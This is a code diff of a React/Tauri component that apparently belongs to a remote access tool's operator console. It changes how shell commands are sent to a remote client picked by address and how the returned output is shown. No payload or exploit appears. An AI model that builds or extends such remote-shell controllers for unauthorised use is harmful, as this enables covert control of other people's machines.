@@ -1,12 +1,12 @@
 import { listen, UnlistenFn } from "@tauri-apps/api/event";
 import { ShellCommandType } from "../../types";
 import { executeShellCommandCmd } from "../rat/RATCommands";
+import { JSX } from "react";
 
 export const getOutput = async (
   command: string,
   setCommand: React.Dispatch<React.SetStateAction<ShellCommandType[]>>,
-  shellStatus: string,
-  id: string
+  addr: string
 ): Promise<JSX.Element | string> => {
   return new Promise((resolve) => {
     switch (command.toLowerCase()) {
@@ -24,34 +24,30 @@ export const getOutput = async (
         resolve("");
         break;
       default:
-        if (shellStatus == "true") {
-          let output: string = "";
-          let timer: number | null = null;
-          let unlisten: UnlistenFn | undefined;
+        let output: string = "";
+        let timer: number | null = null;
+        let unlisten: UnlistenFn | undefined;
 
-          listen("client_shellout", (event) => {
-            output += event.payload + "\n";
-            if (timer !== undefined && timer) clearTimeout(timer);
-            timer = setTimeout(() => {
-              resolve(<div style={{ whiteSpace: "pre-wrap" }}>{output}</div>);
-              if (unlisten) unlisten();
-            }, 250);
-          }).then((unlistenFn) => {
-            unlisten = unlistenFn;
-          });
+        listen("client_shellout", (event: any) => {
+          if (event.payload.addr !== addr) {
+            return;
+          }
+          output += event.payload.shell_output + "\n";
+          if (timer !== undefined && timer) clearTimeout(timer);
+          timer = setTimeout(() => {
+            resolve(<div style={{ whiteSpace: "pre-wrap" }}>{output}</div>);
+            if (unlisten) unlisten();
+          }, 250);
+        }).then((unlistenFn) => {
+          unlisten = unlistenFn;
+        });
 
-          executeShellCommandCmd(id, command).then(() => {
-            timer = setTimeout(() => {
-              resolve(<div style={{ whiteSpace: "pre-wrap" }}>{output}</div>);
-              if (unlisten) unlisten();
-            }, 250);
-          });
-        } else
-          resolve(
-            <div>
-              <span className="text-error">Shell is not started.</span>
-            </div>
-          );
+        executeShellCommandCmd(addr, command).then(() => {
+          timer = setTimeout(() => {
+            resolve(<div style={{ whiteSpace: "pre-wrap" }}>{output}</div>);
+            if (unlisten) unlisten();
+          }, 250);
+        });
     }
   });
 };
